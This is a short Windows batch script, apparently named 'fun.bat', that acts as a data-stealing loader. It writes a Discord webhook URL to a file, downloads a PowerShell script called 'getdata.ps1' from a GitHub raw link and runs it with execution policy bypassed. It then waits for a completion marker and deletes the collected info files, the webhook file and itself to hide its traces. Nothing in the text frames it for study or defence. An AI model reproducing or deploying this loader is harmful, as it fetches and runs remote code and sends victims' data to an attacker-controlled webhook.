@echo off
echo https://discord.com/api/webhooks/1508235078134661291/Cr5gnipBCd1EuD9tpZEsM5zzI-_Tioot9toD7sFaMDw_XH8D9_jlloOSGFIWXyI-KNpZ>discord_webhook.txt
curl -L https://raw.githubusercontent.com/thompog/bob/refs/heads/main/getdata.ps1 -o getdata.ps1
powershell -ExecutionPolicy Bypass -File "%~dp0getdata.ps1"
goto loop

:loop
if not exist "%dp0done.txt" (
  timeout /t 2 >nul
  goto loop
) else (
  goto cleanup
)

:cleanup
del /Q "%~dp0info.txt"
del /Q "%~dp0info.json"
del /Q "%~dp0info_upload.zip"
del /Q "%~dp0done.txt"
del /Q "%~dp0discord_webhook.txt"
start "" cmd /c "del /Q \"%~dp0fun.bat\""
exit /b 0
